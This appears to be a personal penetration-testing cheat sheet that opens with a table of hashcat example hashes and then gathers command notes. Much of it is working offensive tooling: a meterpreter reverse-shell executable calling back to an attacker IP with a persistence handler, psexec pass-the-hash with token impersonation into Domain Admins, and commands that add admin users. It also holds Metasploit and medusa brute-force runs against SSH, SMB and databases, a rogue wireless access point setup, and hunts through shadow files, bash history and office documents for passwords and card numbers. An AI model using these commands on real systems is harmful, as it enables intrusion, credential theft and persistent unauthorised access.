            1750	HMAC-SHA512 (key = $pass) 	94cb9e31137913665dbea7b058e10be5f050cc356062a2c9679ed0ad6119648e7be620e9d4e1199220cd02b9efb2b1c78234fa1000c728f82bf9f14ed82c1976:1234
            1760	HMAC-SHA512 (key = $salt) 	7cce966f5503e292a51381f238d071971ad5442488f340f98e379b3aeae2f33778e3e732fcc2f7bdc04f3d460eebf6f8cb77da32df25500c09160dd3bf7d2a6b:1234
            1800	sha512crypt, SHA512(Unix) 2 	$6$52450745$k5ka2p8bFuSmoVT1tzOyyuaREkkKBcCNqoDKzYiJL9RaE8yMnPgh2XzzF0NDrUhgrcLwg78xs1w5pJiypEdFX/
            2100	Domain Cached Credentials2, mscash2 	$DCC2$10240#tom#e4e938d12fe5974dc42a90120bd9c90f
            2400	Cisco-PIX MD5 	dRRVnUmUHXOTt9nk
            2410	Cisco-ASA MD5 	02dMBMYkTdC5Ziyp:36
            2500	WPA/WPA2 1 	http://hashcat.net/misc/example_hashes/hashcat.hccap
            2600	Double MD5 	a936af92b0ae20b1ff6c3347a72e5fbe
            3000	LM 	299bd128c1101fd6
            3100	Oracle 7-10g, DES(Oracle) 	7A963A529D2E3229:3682427524
            3200	bcrypt, Blowfish(OpenBSD) 	$2a$05$LhayLxezLhK1LhWvKxCyLOj0j1u.Kj0jZ0pEmm134uzrQlFvQJLF6
            3300	MD5(Sun) 3 	$md5$rounds=904$iPPKEBnEkp3JV8uX$0L6m7rOFTVFn.SGqo2M9W1
            3500	md5(md5(md5($pass))) 	9882d0778518b095917eb589f6998441
            3610	md5(md5($salt).$pass) 	7b57255a15958ef898543ea6cc3313bc:1234
            3710	md5($salt.md5($pass)) 	95248989ec91f6d0439dbde2bd0140be:1234
            3720	md5($pass.md5($salt)) 	10ce488714fdbde9453670e0e4cbe99c:1234
            3810	md5($salt.$pass.$salt) 	2e45c4b99396c6cb2db8bda0d3df669f:1234
            3910	md5(md5($pass).md5($salt)) 	250920b3a5e31318806a032a4674df7e:1234
            4010	md5($salt.md5($salt.$pass)) 	30d0cf4a5d7ed831084c5b8b0ba75b46:1234
            4110	md5($salt.md5($pass.$salt)) 	b4cb5c551a30f6c25d648560408df68a:1234
            4210	md5($username.0.$pass) 	09ea048c345ad336ebe38ae5b6c4de24:1234
            4300	md5(strtoupper(md5($pass))) 	b8c385461bb9f9d733d3af832cf60b27
            4400	md5(sha1($pass)) 	288496df99b33f8f75a7ce4837d1b480
            4500	Double SHA1 	3db9184f5da4e463832b086211af8d2314919951
            4600	sha1(sha1(sha1($pass))) 	dc57f246485e62d99a5110afc9264b4ccbfcf3cc
            4700	sha1(md5($pass)) 	92d85978d884eb1d99a51652b1139c8279fa8663
            4800	MD5(Chap), iSCSI CHAP authentication 	afd09efdd6f8ca9f18ec77c5869788c3:01020304050607080910111213141516:01
            5000	SHA-3(Keccak) 	203f88777f18bb4ee1226627b547808f38d90d3e106262b5de9ca943b57137b6
            5100	Half MD5 	8743b52063cd8409
            5200	Password Safe SHA-256 	http://hashcat.net/misc/example_hashes/hashcat.psafe3
            5300	IKE-PSK MD5 	http://hashcat.net/misc/example_hashes/hashcat.ikemd5
            5400	IKE-PSK SHA1 	http://hashcat.net/misc/example_hashes/hashcat.ikesha1
            5500	NetNTLMv1-VANILLA / NetNTLMv1+ESS 	u4-netntlm::kNS:338d08f8e26de93300000000000000000000000000000000:9526fb8c23a90751cdd619b6cea564742e1e4bf33006ba41:cb8086049ec4736c
            5600	NetNTLMv2 	admin::N46iSNekpT:08ca45b7d7ea58ee:88dcbe4446168966a153a0064958dac6:5c7830315c7830310000000000000b45c67103d07d7b95acd12ffa11230e0000000052920b85f78d013c31cdb3b92f5d765c783030
            5700	Cisco-IOS SHA256 	2btjjy78REtmYkkW0csHUbJZOstRXoWdX1mGrmmfeHI
            5800	Samsung Android Password/PIN 	0223b799d526b596fe4ba5628b9e65068227e68e:f6d45822728ddb2c
            6000	RipeMD160 	012cb9b334ec1aeb71a9c8ce85586082467f7eb6
            6100	Whirlpool 	7ca8eaaaa15eaa4c038b4c47b9313e92da827c06940e69947f85bc0fbef3eb8fd254da220ad9e208b6b28f6bb9be31dd760f1fdb26112d83f87d96b416a4d258
            6211	PBKDF2-HMAC-RipeMD160/AES 	http://hashcat.net/misc/example_hashes/hashcat_ripemd160.tc
            6221	PBKDF2-HMAC-SHA512/AES 	http://hashcat.net/misc/example_hashes/hashcat_sha512.tc
            6231	PBKDF2-HMAC-Whirlpool/AES 	http://hashcat.net/misc/example_hashes/hashcat_whirlpool.tc
            6241	PBKDF2-HMAC-RipeMD160-boot/AES 	http://hashcat.net/misc/example_hashes/hashcat_ripemd160_boot.tc
            6300	AIX {smd5} 	{smd5}a5/yTL/u$VfvgyHx1xUlXZYBocQpQY0
            6400	AIX {ssha256} 	{ssha256}06$aJckFGJAB30LTe10$ohUsB7LBPlgclE3hJg9x042DLJvQyxVCX.nZZLEz.g2
            6500	AIX {ssha512} 	{ssha512}06$bJbkFGJAB30L2e23$bXiXjyH5YGIyoWWmEVwq67nCU5t7GLy9HkCzrodRCQCx3r9VvG98o7O3V0r9cVrX3LPPGuHqT5LLn0oGCuI1..
            6600	1Password, Agile Keychain 	http://hashcat.net/misc/example_hashes/hashcat.agilekeychain
            6700	AIX {ssha1} 	{ssha1}06$bJbkFGJAB30L2e23$dCESGOsP7jaIIAJ1QAcmaGeG.kr
            6800	Lastpass 1, 4 	a2d1f7b7a1862d0d4a52644e72d59df5:500:lp@trash-mail.com
            6900	GOST R 34.11-94 	df226c2c6dcb1d995c0299a33a084b201544293c31fc3d279530121d36bbcea9
            7000	Fortigate (FortiOS) 	AK1AAECAwQFBgcICRARNGqgeC3is8gv2xWWRony9NJnDgEA
            7100	OS X v10.8 / v10.9 	$ml$35460$93a94bd24b5de64d79a5e49fa372827e739f4d7b6975c752c9a0ff1e5cf72e05$752351df64dd2ce9dc9c64a72ad91de6581a15c19176266b44d98919dfa81f0f96cbcb20a1ffb400718c20382030f637892f776627d34e021bad4f81b7de8222
            7200	GRUB 2 	grub.pbkdf2.sha512.10000.7d391ef48645f626b427b1fae06a7219b5b54f4f02b2621f86b5e36e83ae492bd1db60871e45bc07925cecb46ff8ba3db31c723c0c6acbd4f06f60c5b246ecbf.26d59c52b50df90d043f070bd9cbcd92a74424da42b3666fdeb08f1a54b8f1d2f4f56cf436f9382419c26798dc2c209a86003982b1e5a9fcef905f4dfaa4c524
            7300	IPMI2 RAKP HMAC-SHA1 	b7c2d6f13a43dce2e44ad120a9cd8a13d0ca23f0414275c0bbe1070d2d1299b1c04da0f1a0f1e4e2537300263a2200000000000000000000140768617368636174:472bdabe2d5d4bffd6add7b3ba79a291d104a9ef
            7400	sha256crypt, SHA256(Unix) 2 	$5$rounds=5000$GX7BopJZJxPc/KEK$le16UF8I2Anb.rOrn22AUPWvzUETDGefUmAV8AZkGcD
            7500	Kerberos 5 AS-REQ Pre-Auth 	$krb5pa$23$user$realm$salt$4e751db65422b2117f7eac7b721932dc8aa0d9966785ecd958f971f622bf5c42dc0c70b532363138363631363132333238383835
            7700	SAP CODVN B (BCODE) 	435748802305$70AE4FF6C945B78F
            7800	SAP CODVN F/G (PASSCODE) 	034488234401$3F9CB8B0EFC58A8536DC0121794F672A626D78FB
            7900	Drupal7 	$S$C33783772bRXEx1aCsvY.dqgaaSu76XmVlKrW9Qu8IQlvxHlmzLf
            8000	Sybase ASE 	0xc00778168388631428230545ed2c976790af96768afa0806fe6c0da3b28f3e132137eac56f9bad027ea2
            8100	Citrix Netscaler 	1765058016a22f1b4e076dccd1c3df4e8e5c0839ccded98ea
            8200	1Password, Cloud Keychain 	http://hashcat.net/misc/example_hashes/hashcat.cloudkeychain
            8300	DNSSEC (NSEC3) 	7b5n74kq8r441blc2c5qbbat19baj79r:.lvdsiqfj.net:33164473:1
            8400	WBB3, Woltlab Burning Board 3 	8084df19a6dc81e2597d051c3d8b400787e2d5a9:6755045315424852185115352765375338838643
            8500	RACF 	$racf$*USER*FC2577C6EBE6265B
            8600	Lotus Notes/Domino 5 	3dd2e1e5ac03e230243d58b8c5ada076
            8700	Lotus Notes/Domino 6 	(GDpOtD35gGlyDksQRxEU)
            9999	Plaintext 	hashcat
            		
            1 password: hashcat!		
            2 rounds=[# of iterations] is optional here, after signature, e.g. $5$rounds=5000		
            3 as in 2 but the number of rounds must be specified		
            4 the hash used here is not the one send via e.g. the web-interface to lastpass servers (pbkdf2_sha256_hex (pbkdf2_sha256 ($pass, $email, $iterations), $pass, 1) but instead the one stored (by e.g. your browser or the pocket version) to disk, opera/chrome for instance use local sqlite databases, firefox uses files with ending _lpall.slps - for linux: 2nd line is interesting / base64 decode it, for win see here - and _key.itr		
            		
            Specific hash types:		
            Hash-Mode 	Hash-Name 	Example
            11	Joomla < 2.5.18 	19e0e8d91c722e7091ca7a6a6fb0f4fa:547180318425216517577853af0389f093b181ae26452015f4ae728:user603028777
            21	osCommerce, xt:Commerce 	374996a5e8a5e57fd97d893f7df79824:36
            22	Juniper Netscreen/SSG (ScreenOS) 	nNxKL2rOEkbBc9BFLsVGG6OtOUO/8n:user
            23	Skype 	3af0389f093b181ae26452015f4ae728:user
            101	nsldap, SHA-1(Base64), Netscape LDAP SHA 	{SHA}uJ6qx+YUFzQbcQtyd2gpTQ5qJ3s=
            111	nsldaps, SSHA-1(Base64), Netscape LDAP SSHA 	{SSHA}AZKja92fbuuB9SpRlHqaoXxbTc43Mzc2MDM1Ng==
            112	Oracle 11g 	ac5f1e62d21fd0529428b84d42e8955b04966703:38445748184477378130
            121	SMF >= v1.1 	ecf076ce9d6ed3624a9332112b1cd67b236fdd11:17782686
            122	OS X v10.4, v10.5, v10.6 	1430823483d07626ef8be3fda2ff056d0dfd818dbfe47683
            123	EPi 	0x326C6D7B4E4F794B79474E36704F35723958397163735263516265456E31 0xAFC55E260B8F45C0C6512BCE776C1AD8312B56E6
            131	MSSQL(2000) 	0x01002702560500000000000000000000000000000000000000008db43dd9b1972a636ad0c7d4b8c515cb8ce46578
            132	MSSQL(2005) 	0x010018102152f8f28c8499d8ef263c53f8be369d799f931b2fbe
            133	PeopleSoft 	uXmFVrdBvv293L9kDR3VnRmx4ZM=
            141	EPiServer 6.x < v4 	$episerver$*0*bEtiVGhPNlZpcUN4a3ExTg==*utkfN0EOgljbv5FoZ6+AcZD5iLk
            1421	hMailServer 	8fe7ca27a17adc337cd892b1d959b4e487b8f0ef09e32214f44fb1b07e461c532e9ec3
            1441	EPiServer 6.x >= v4 	$episerver$*1*MDEyMzQ1Njc4OWFiY2RlZg==*lRjiU46qHA7S6ZE7RfKUcYhB85ofArj1j7TrCtu3u6Y
            1711	SSHA-512(Base64), LDAP {SSHA512} 	{SSHA512}ALtwKGBdRgD+U0fPAy31C28RyKYx7+a8kmfksccsOeLknLHv2DBXYI7TDnTolQMBuPkWDISgZr2cHfnNPFjGZTEyNDU4OTkw
            1722	OS X v10.7 	648742485c9b0acd786a233b2330197223118111b481abfa0ab8b3e8ede5f014fc7c523991c007db6882680b09962d16fd9c45568260531bdb34804a5e31c22b4cfeb32d
            1731	MSSQL(2012), MSSQL(2014) 	0x02000102030434ea1b17802fd95ea6316bd61d2c94622ca3812793e8fb1672487b5c904a45a31b2ab4a78890d563d2fcf5663e46fe797d71550494be50cf4915d3f4d55ec375
            2611	vBulletin < v3.8.5 	16780ba78d2d5f02f3202901c1b6d975:568
            2612	PHPS 	$PHPS$34323438373734$5b07e065b9d78d69603e71201c6cf29f
            2711	vBulletin >= v3.8.5 	bf366348c53ddcfbd16e63edfdd1eee6:181264250056774603641874043270
            2811	IPB2+, MyBB1.2+ 	8d2129083ef35f4b365d5d87487e1207:47204
            3711	Mediawiki B type 	$B$56668501$0ce106caa70af57fd525aeaf80ef2898
            3721	WebEdition CMS 	fa01af9f0de5f377ae8befb03865178e:5678
            7600	Redmine Project Management Web App 	536befdaffc3e2215e481aded7e32134906a673b:1234
            
            
            

more examples hashes cracked john 
-------------------

            
            user:2d9f0b052932ad18b87f315641921cda:lab:lab.internal
            Service currently active. Stopping service...
            Service successfully removed.
            
            John Plugin:
            $ ./john -format:mscash ./mscash.txt
            Loaded 1 password hash (M$ Cache Hash [mscash])
            password (user
            
             
            

set power profile via command line  
-------------------

            
            Powercfg.exe /SETACTIVE "Always On" 
            Powercfg.exe /SETACTIVE "Max Battery"
            
            #Remove the .NET Credentials (Stored User names and Passwords)
            Control keymgr.dll
            
            

convert amr to mp3
-------------------

            ffmpeg -i file.amr -vn -acodec libmp3lame -ac 2 -ab 96k file.mp3
            FOR /F "delims==" %%A IN ('DIR/B "*.amr"') DO ffmpeg -i %%A -vn -acodec libmp3lame -ac 2 -ab 96k %%A.mp3
            
            
            #windows saved passwords
            rundll32.exe keymgr.dll, KRShowKeyMgr
            

check for mod date range
-------------------

            find / -type f -newermt 2011-10-01 ! -newermt 2012-04-30
            
            # openvas on 11.10 
            take src out of the sources.list
            add --http-only to the /etc/init.d/greenbone-security-assistant startup script 
            

mass set path
-------------------

            export PATH=$PATH:`find /usr/lib/ruby/1.9.1 -type d | sed 's/$/:/g' | tr -d '\n'`
            
            
            

top web ports ports
-------------------

            80-83,99,100,443,631,800,1000,1739,2002,2301,2381,3000,5800,5988,5989,8000-8080,808,8099,8100-8105,8443,8888,8900,9999,10000
            

more web ports
-------------------

            10080,10100,10243,10250,10251,1027,1029,1030,1032,10439,10444,11267,1183,1184,11869,11905,11910,11935,1208,13080,1416,14176,14654,16000,16080,16372,17012,18083,1818,18180,1830,1831,19000,19082,19091,19101,1947,1972,19740,2002,2030,20444,2130,2140,21988,2301,2316,2381,2414,2424,24305,2480,2523,25684,25825,2693,27775,280,28080,2851,2869,30444,30900,31458,31459,3201,3227,32843,3339,34988,35135,35145,3526,3617,3790,37922,3842,3914,3938,4036,4053,41647,4220,4239,4343,443,45000,4680,47001,4723,48018,4848,4864,49152,49157,50000,50001,50038,51785,51905,51908,5225,53001,5357,5440,5447,5449,5469,54850,5500,5501,554,5554,55885,56414,56737,57423,57772,57773,5800,5801,591,593,5985,5989,60000,6001,6002,6003,6004,60213,61000,6107,6108,6113,6114,6160,6161,631,6325,6453,6454,65084,65093,6842,7001,7002,7003,7070,7099,7126,7191,7359,7453,7454,7717,7751,80,8000,8001,8002,8003,8004,8008,8020,8070,8071,8077,8080,8081,8082,8083,8085,8086,8087,8088,8090,8093,8094,8095,8099,81,8107,8113,8114,8115,8118,8120,8123,8126,8133,8135,8138,815,8150,8151,8180,82,8200,8222,8260,8300,8323,8333,84,8444,85,8530,8533,86,8660,8666,8701,8703,8732,8733,8740,8878,8880,8888,8889,8900,90,9000,9001,9002,9005,9006,9073,9080,9081,9084,9086,9087,9090,9091,9191,9300,9310,9444,9501,9510,9595,9642,9675,9676,9797,9823,9887
            
            #sap ports
            32000,33000,34000,36000,47000,48000,21-23,25,21-23,25,80-83,53,110,135,139,445,3128,1433,1521,3306,3389,5900,6001,8080,8888,80-83,53,110,135,139,445,3128,1433,1521,3306,3389,5900,6001,8080,8888,99,100,443,631,800,1000,1739,2002,2301,2381,3000,5800,5988,5989,8000-8015,8080-8083,8099,8100-8105,8443,8888,8900,9999,10000
            

common proxy ports
-------------------

            80,81,82,83,84,85,86,443,808,3128,6515,6666,8000,8001,8008,8080,8081,8088,8090,8118,8181,8888,8909,9000,9090,54321 
            
            
            
            
            
            

nslookup to CSV
-------------------

            for i in `cat FULL` ;do echo "IP$i";nslookup $i|grep 'name ='|sed 's/.*name = /,/g'|sed 's/\.$//g';done| tr -d '\n' | awk '{gsub("IP","\n"); print}'
            
            
            # my-ip-neighbors lookup
            # 200 at a time .. you need to change the -x to a proxy that works .. rmccurdy.com/scripts/proxy/good.txt
            # test google before you start .. 
            # curl -x 184.171.175.14:808 http://google.com etc ..
            
            
            for i in `cat FULL`;do echo curl -x 184.171.175.14:808 "\""http://www.my-ip-neighbors.com/?domain=$i"\"";done > go
            bash -x go > out
            

grep the output for all the goodies and make it nice CSV 
-------------------

            egrep "(\"http:\/\/whois\.domaintools\.com|domain\" value=\")" out | sed 's/.*domain\" value=\"/IP /g' | sed 's/\"\/>.*//g' | sed 's/.*domaintools.com\//,/g' | sed 's/" t.*//g' | tr -d '\n' | awk '{gsub("IP","\n"); print}'
            
            
            
            
            

block port 80 throttle 
-------------------

            iptables  -A INPUT -p tcp --syn --dport 80 -m connlimit --connlimit-above 4 -j REJECT
            #ssh block stuff fu 
            iptables -A INPUT -i eth0 -p tcp --dport 22 -m state --state NEW -m recent --set --name SSH
            iptables -A INPUT -i eth0 -p tcp --dport 22 -m state --state NEW -m recent --update --seconds 60 --hitcount 8 --rttl --name SSH -j DROP
            
            
            
            

CURL HTTPS
-------------------

            for i in `cat check`;do echo curl -L -k --location-trusted -m 3 -L -o $i.htm "\""https://$i"\"";done > https
            
            
            # airbase/karma.rc setup
            
            
            --------------------
            
            gogogo
            ----------------
            

change eth1 to internet interface
-------------------

            iptables --table nat --append POSTROUTING --out-interface eth1 -j MASQUERADE
            iptables --append FORWARD --in-interface at0 -j ACCEPT
            echo 1 > /proc/sys/net/ipv4/ip_forward
            
            
            # kill stuff the will cause issues ..
            killall dhcpd3 dhclient dhclient3 dhcpcd dhcpd
            
            # start MSF karma.rc script  logs are screenlog.0 etc ..
            xterm -e "screen -L /pentest/exploits/framework/msfconsole -r /stuff/karma.rc" &
            
            # takes a wile to startup .. lets wait we need it all ready to work before people connect to it so we dont miss packets !!!
            
            echo "waiting for MSF karma to start .. 50sec"
            sleep 20
            

monitor mode change wlan1 to your wifi
-------------------

            airmon-ng start wlan1
            
            sleep 5
            

setup fake AP
-------------------

            xterm -e "airbase-ng -c 6 -P mon0 -v" &
            
            sleep 5
            
            ifconfig at0 up 10.0.0.1 netmask 255.255.255.0 &
            

setup DHCP server
-------------------

            xterm -e "dhcpd3 -cf /etc/dhcp3/dhcpd.conf at0" &
            
            # DEBUG DHCP to see DHCP request hits xterm -e "tcpdump -i at0 -n port 67 and port 68"  &
            
            
            ------------------
            
             
            
            
            # XSS
            >"'><script>alert('XSS')</script>
            # add full read write read/write full R/W on registry key
            SetACL.exe -on "HKEY_LOCAL_MACHINE\Software\Microsoft\Policies" -ot reg -actn ace -ace "n:MyDomain\JohnDoe;p:full"
            # add -P0 for no ping
            /usr/bin/screen -fa -d -m  nmap -T5  -p 20,21,80,115,443,989,990 -vvvv -sS  -n --max-rtt-timeout 300ms --max-retries 1 192.30.0.0/16 -oA /home/administrator/rmccurdy/192.30.0.0_fast_ping
            # msf metasploit use login to get msfshell for pivot/token 
            use exploit/windows/smb/psexec
            
            set RHOST 192.168.64.123
            set SMBUser adminit
            set SMBPass password
            # also set HASHES !! set SMBPass 81cbcea8a9af93bbaad3b435b51404ee:561cbdae13ed5abd30aa94ddeb3cf52d
            
            exploit
            
            getuid
            use priv
            getsystem
            use incognito
            list_tokens -u
            add_group_user "Domain Admins"
            impersonate_token "DOMAIN\\user"

add user and give it local admin
-------------------

            net user  test PASSWORDHERE /add
            net localgroup administrators test /add
            

add user to domain and makt it domain admin
-------------------

            net user /add USERNAME STRONGPASSWORD /domain
            net group  /add "domain admins" USERNAME /domain
            
            ---------------------------
            # make exe 
            ./msfpayload windows/meterpreter/reverse_tcp LHOST=192.168.6.55 LPORT=443 R | ./msfencode -t exe -c 5 -o /tmp/bob.exe
            

attacker listen
-------------------

            use exploit/multi/handler
            set PAYLOAD windows/meterpreter/reverse_tcp
            set LHOST 192.168.6.55 
            set LPORT 443
            set ExitOnSession false

set AutoRunScript pathto script you want to autorun after exploit is run
-------------------

            set AutoRunScript persistence -r 192.168.6.55 -p 443 -A -X -i 30
            
            exploit -j -z
             
            
            # armatage DONT USE THIS JUIST USE BIN INSTALL FROM WEBSITE .. INCLUDES FULL AND POSTGRES BINS 
            apt-get install mysql-server -y
            /etc/init.d/mysql start
            
            mysqladmin -u root -ppassword password toor
            /pentest/exploits/framework/msfrpcd -f -U msf -P test -t Basic
            

armatage DONT USE THIS METHOD USE THE BIN FROM WEBSITE IT HAS ITS OWN POSTGRES
-------------------

            
            apt-get install -y postgresql
            
            apt-get install libpq-dev -y
            
            gem install postgres
            
            /etc/init.d/postgresql start
            su -
            su - postgres
             
            
            createuser msf_user -P
            createdb --owner=msf_user msf
             
            /pentest/exploits/framework/msfrpcd -f -U msf -P msf -t Basic
            /pentest/exploits/framework/armitage 
            
             
             ---- 
            
             
            # ssh 
            use auxiliary/scanner/ssh/ssh_login
            
            #set RHOSTS_FILE "C:/backup/wordlist/targests.txt"
            set RHOSTS 192.59.139.135 192.59.139.136 192.59.139.140 192.116.61.25 192.116.61.26 192.116.61.34
            # also set RHOSTS file://bla
            # set USER_FILE "C:/backup/wordlist/password_large.txt"
            set USERPASS_FILE "C:/backup/wordlist/root_userpass.txt"
            set VERBOSE true
            set STOP_ON_SUCCESS true
            set BRUTEFORCE_SPEED 5

set this to the number of host 
-------------------

            set THREADS 6
            
            run
            
            use auxiliary/gather/dns_enum
            set DOMAIN domain.com
            run 
            #smb 
            
            use auxiliary/scanner/smb/smb_login
            
            set RHOSTS file://192.168.8.39
            set RHOSTS 127.0.0.1
            
            set USER_FILE "C:/wordlist/users.txt"
            set PASS_FILE "C:/wordlist/2.txt" 
            set VERBOSE false
            # set to number of host scanning .
            set THREADS 16
            
            set STOP_ON_SUCCESS true
            set VERBOSE false
              Name                             Value
              ----                             -----
              BLANK_PASSWORDS                  false
              BRUTEFORCE_SPEED                 5
              ConnectTimeout                   10
              DCERPC::ReadTimeout              10
              DCERPC::fake_bind_multi          true
              DCERPC::fake_bind_multi_append   0
              DCERPC::fake_bind_multi_prepend  0
              DCERPC::max_frag_size            4096
              DCERPC::smb_pipeio               rw
              MaxGuessesPerService             0
              MaxGuessesPerUser                0
              MaxMinutesPerService             0
              NTLM::SendLM                     true
              NTLM::SendNTLM                   true
              NTLM::SendSPN                    true
              NTLM::UseLMKey                   false
              NTLM::UseNTLM2_session           true
              NTLM::UseNTLMv2                  true
              PRESERVE_DOMAINS                 true
              REMOVE_PASS_FILE                 false
              REMOVE_USERPASS_FILE             false
              REMOVE_USER_FILE                 false
              RHOST                            file:/home/rmccurdy/high
            
            # http
            
            use auxiliary/scanner/http/http_login
            set AUTH_URI /folder?dcPath=ha-datacenter
            set RHOSTS 127.0.0.1 127.0.0.1 127.0.0.1 
            set VERBOSE true
            run
            back
            
            # telnet
            use auxiliary/scanner/telnet/telnet_login 
            set RHOSTS 127.0.0.1,49,50
            
            set PASS_FILE "C:/wordlist/password_small.txt" 
            set THREADS 254
            run
            
            back
            # mssql
            use auxiliary/scanner/mssql/mssql_login
            set RHOSTS 127.0.0.1
            set PASS_FILE "C:/wordlist/password_small.txt" 
            set USERNAME sa
            set VERBOSE false
            run
            back
            
             
            
            #ftp
            use auxiliary/scanner/ftp/ftp_login
            set RHOSTS  127.0.0.1
            set PASS_FILE /home/administrator/small.txt
            set USER_FILE /home/administrator/small.txt
            set BRUTEFORCE_SPEED 1
            run
            
            #snmp
            use auxiliary/scanner/snmp/snmp_login
            set RHOSTS  127.0.0.1
            set PASS_FILE "C:/wordlist/snmp_default_pass.txt" 
            set VERBOSE false
            
            run
            
            nmap --script=smtp-open-relay.nse -p 25 -iL 25 -n
            ./sfuzz -T O -f sfuzz-sample/basic.http -S 50.74.10.218 -p 179
            # got r00t got r00t ?
            
            # ref http://en.wikipedia.org/wiki/Setuid

find Setuid world writable files
-------------------

            find / \( \( -perm -4000 -o -perm -2000 -type f \) -and \( -perm -0002 -o -perm -0020 \) \) -type f -ls
            
            
            # search home for passwords ..
            cd /home
            grep -iar password  * -A 1 -B 1 |strings >/tmp/home_pass;less /tmp/home_pass
            

search a path for READ accesss using file command 
-------------------

            find . -maxdepth 5 -exec file '{}' \; | grep -v "no read" | grep -v directory >/tmp/mnt
            
            # bash history very gooOOOd !
            updatedb;locate .bash_history
            

crack with extrem gpu brute force
-------------------

            cat /etc/shadow | grep -v ":\*:"

use on other servers by checking bash history
-------------------

            updatedb;locate authorized
            

find files modifyed the past 7 days
-------------------

            find / -type f -mtime -7|egrep -v "(proc|\/sys)"
            
            # you can look for other file types sql,*.php,*sql.tar.gz,*pass*,sudousers,/etc/passwd,/root/.ssh or ~/.ssh,password 
            locate *.sql
            locate sql.tar.gz

what services are listing the part at the top
-------------------

            netstat -na | grep LIS
            lsof -nPi
            
            
            

Search office documents for PII
-------------------

            # CC with SSN no dash ( high false positive )
            find  . -iname "*.???x" -type f -exec  unzip -p '{}' '*'  \; | sed -e 's/<[^>]\{1,\}>/ /g; s/[^[:print:]]\{1,\}/ /g' | egrep "\b4[0-9]{12}(?:[0-9]{3})?\b|\b5[1-5][0-9]{14}\b|\b6011[0-9]{14}\b|\b3(?:0[0-5]\b|\b[68][0-9])[0-9]{11}\b|\b3[47][0-9]{13}\b|\b[0-9]{3}-[0-9]{2}-[0-9]{4}\b|\b[0-9]{9}\b"
            
            # CC with SSN dash (  low false positive only match ###-##-#### not any 8digi number )
            find  . -iname "*.???x" -type f -exec  unzip -p '{}' '*'  \; | sed -e 's/<[^>]\{1,\}>/ /g; s/[^[:print:]]\{1,\}/ /g' | egrep "\b4[0-9]{12}(?:[0-9]{3})?\b|\b5[1-5][0-9]{14}\b|\b6011[0-9]{14}\b|\b3(?:0[0-5]\b|\b[68][0-9])[0-9]{11}\b|\b3[47][0-9]{13}\b|\b[0-9]{3}-[0-9]{2}-[0-9]{4}\b"
            
            
            
            

find config files with company names in them
-------------------

            find . -type f -size -1000000 -exec grep -B 3 -A 3 -Hi COMPANYNAMEHERE '{}' \; > grep_config_companyname.txt
            

find config files with Internal IP space in them
-------------------

            find . -type f -size -1000000 -exec grep -Hi -B 3 -A 3 \b(10|172|192)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\b  '{}' \;  > grep_config_internalip.txt
            
            # grep LARGE ! files in this case sql files with company name
            find . -type f *.sql -exec grep -Hi  -B 3 -A 3 COMPANYNAMEHERE '{}' \;  > grep_config_internalip.txt
            
            
            ---------
            
            more notes :
            -------------
            # class b ADDfff -Pn to not ping ( assume up and no ping scan, it will take longer ) use control + D to end script and save at job
            # this will run at 7pm in a screen so you can reattach / check status and Ctrl+c out to save and use nmap -r to resume if need be 
            at 19:00
            screen bash at.sh
            # at.sh script
            nmap -T5  -p 20,21,80,115,443,989,990 -vvvv -sS  -n --max-rtt-timeout 300ms --max-retries 1 192.159.0.0/16 -oA /home/administrator/rmccurdy/safg/192.159.0.0_fast_ping

class b external 65k host fast ping scan 7 ports 30min
-------------------

            # Nmap 5.61TEST2 scan initiated Thu Dec 29 21:02:11 2011 as: nmap -T5 -p 20,21,80,115,443,989,990 -vvvv -sS -n --max-rtt-timeout 300ms --max-retries 1 -oA /home/administrator/rmccurdy/safg/192.30.0.0_fast_ping 192.30.0.0/16
            # Ports scanned: TCP(7;20-21,80,115,443,989-990) UDP(0;) SCTP(0;) PROTOCOLS(0;)
            # Nmap done at Thu Dec 29 21:29:10 2011 -- 65536 IP addresses (40675 hosts up) scanned in 1618.92 seconds
             
            nmap --script dns-zone-transfer.nse --script-args dns-zone-transfer.domain=zonetransfer.me -p 53 ns12.zoneedit.com
            for i in `cat 1` ; do curl http://api.hackertarget.com/zonetransfer/?q=$i;done
            
              

medusa hydra 
-------------------

            ./sfuzz -T O -f sfuzz-sample/basic.http -S 50.74.10.218 -p 179
                
            
            http://www.foofus.net/~jmk/medusa/medusa.html
            medusa -M ftp -H targets -u Anonymous -p input_file -v 6 -T 30 -g 2 -R 1
            medusa -M mysql -H # change the -T for more threds -t is for per host keep it 1 ..
            medusa -M ssh -H 22 -u root -p tcr1tt3r -v 6 -g 2 -R 1 -t 1 -T 1
            medusa -h 192.168.1.103 -u administrator -P passwords.txt -e ns -M smbnt
             
            
            mysql -u root -P mysqlpass.txt -v 6 -T 1 -g 2 -R 1
            nmap --script=smtp-open-relay.nse -p 25 -iL 25 -n
            

email over telnet
-------------------

            RSET
            HELO
            MAIL FROM:<root@whatismyip.com>
            RCPT TO:<"freeload101@yahoo.com">
            data
            this is a test from w00t
            .
            --------
            route add 10.101.14.0 netmask 255.255.255.0 gw 10.101.13.1 dev eth05
            
            .\nmap -script smb-check-vulns.nse --script-args=unsafe=1 -p445 10.104.101.59
            .\nmap --script smb-enum-shares.nse -p445 10.104.101.59
            .\nmap --script smb-enum-users.nse -p445 10.104.101.59
            .\nmap.exe --script smtp-commands.nse -pT:25,465,587
            .\nmap.exe --script smtp-enum-users.nse -pT:25,465,587
             a
            
            # sid enum using nmap and metasploits sid.txt 1307 sids in ~8 seconds
            nmap -n --script=oracle-sid-brute -p 1521-1560 192.168.1.141
            
            # try 1255 user/pass
            # requires valid SID  ( default is XE )
            # Performed 1245 guesses in 3 seconds, average tps: 415
            nmap --script oracle-brute -p  1521-1560 --script-args oracle-brute.sid=XE  -n 192.168.1.141
            

oracle shell using OAT Oracle Audit Tool
-------------------

            ose.bat -s 192.168.1.141 -u SYS -p CHANGE_ON_INSTALL -d XE -t Windows
            
            # route all to 10.127.120.97
            route add 0.0.0.0 mask 0.0.0.0 10.127.120.97
            # route 75.131.211.0 to VPN or other connectoin
            route add 75.131.211.0 mask 255.255.255.0 192.168.77.254

route rmccurdy over VPN
-------------------

            route add 75.131.211.0 mask 255.255.255.0 10.31.128.1
            
             
            warvox notes:
            * you also have to contact support and have IAX unlocked on the account
            Â· Normally I have 3 max threads and set it for 15-20 sec then with sql get the completed = 0 and run them thought again with 53 sec ringtime.
            Â· Let me know if you need any help
            google warvox for general notes "login etc .. just read all of it please ... use vitelity as the provider )
